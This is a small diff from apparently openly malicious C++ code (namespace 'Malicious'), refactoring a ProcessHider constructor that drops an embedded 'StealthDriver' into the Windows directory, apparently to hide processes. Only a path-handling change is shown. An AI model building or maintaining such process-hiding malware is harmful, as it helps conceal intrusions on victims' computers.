@@ -24,8 +24,7 @@ namespace Malicious
     
     ProcessHider::ProcessHider()
     {
-		std::string windownPath;
-		System::getWindowsPath(windownPath);
+		std::string windownPath = System::getWindowsPath();
         driverPath = windownPath + "\\" + SYS_DRIVER_FILENAME;
         
         BinaryRessource driver(StealthDriver, sizeof(StealthDriver), driverPath, true);
